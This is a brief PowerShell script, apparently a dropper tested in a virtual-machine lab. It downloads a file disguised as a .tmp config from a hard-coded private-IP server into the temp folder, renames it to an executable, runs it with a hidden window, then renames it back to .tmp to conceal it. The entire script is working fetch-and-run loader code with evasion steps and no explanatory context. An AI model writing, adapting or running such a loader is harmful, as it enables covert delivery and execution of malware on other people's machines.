# $url  = "http://172.16.41.1:8000/config_vmware.tmp"
$url  = "http://192.168.58.1:8000/config_vbox.tmp"

$tmp = Join-Path (Get-Item $env:TEMP).FullName "2fd19d11-d4b7-46d1-94db-7edd16980d15.tmp"
$exe = Join-Path (Get-Item $env:TEMP).FullName "2fd19d11-d4b7-46d1-94db-7edd16980d15.exe"

Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing

Move-Item -Path $tmp -Destination $exe -Force
Start-Process $exe -WindowStyle Hidden
Move-Item -Path $exe -Destination $tmp -Force